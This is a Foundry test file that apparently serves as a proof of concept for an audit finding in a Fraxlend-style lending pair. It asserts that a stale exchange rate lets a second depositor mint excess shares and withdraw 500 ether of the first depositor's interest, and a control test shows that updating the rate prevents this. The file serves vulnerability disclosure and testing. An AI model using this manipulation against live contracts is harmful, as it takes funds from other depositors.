// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, FraxlendPair, AssetToken} from "./17912-leveragedposition-and-repayassetwithcollateral-do-not-update.sol";

contract Finding17912Test is Test {
    function test_exploit_second_user_mints_and_withdraws_too_much() public {
        Exploit e = new Exploit();
        uint256 beforeBal = e.asset().balanceOf(address(e));
        e.run();

        assertEq(beforeBal, 1000 ether, "bob start");
        assertEq(e.fairShares(), 500 ether, "true mint");
        assertEq(e.staleShares(), 1000 ether, "stale mint");
        assertEq(e.withdrawn(), 1500 ether, "stale withdraw");
        assertEq(e.asset().balanceOf(address(e)), 1500 ether, "bob end");
        assertEq(e.asset().balanceOf(address(e)) - beforeBal, 500 ether, "profit");
        assertEq(e.pair().totalAssets(), 1500 ether, "assets left for alice");
        assertEq(e.pair().exchangeRate(), 1.5 ether, "refreshed rate");
        assertEq(e.pair().debt(address(e.alice())), 100 ether, "stale borrow booked");

        console2.log("stale shares minted");
        console2.log(e.staleShares());
        console2.log("fair shares at the updated rate");
        console2.log(e.fairShares());
        console2.log("assets withdrawn on the stale mint");
        console2.log(e.withdrawn());
        console2.log("assets left for the first depositor");
        console2.log(e.pair().totalAssets());
    }

    function test_control_update_rate_mints_fair_shares() public {
        Exploit e = new Exploit();
        uint256 beforeBal = e.asset().balanceOf(address(e));
        (uint256 shares, uint256 assetsOut) = e.runControl();

        assertEq(e.pair().exchangeRate(), 2 ether, "rate updated to 2e18");
        assertEq(shares, 500 ether, "fair mint");
        assertEq(assetsOut, 1000 ether, "fair withdraw");
        assertEq(e.asset().balanceOf(address(e)), beforeBal, "no profit");
        assertEq(e.pair().totalAssets(), 2000 ether, "alice keeps the interest");

        console2.log("control shares");
        console2.log(shares);
        console2.log("control assets out");
        console2.log(assetsOut);
    }
}
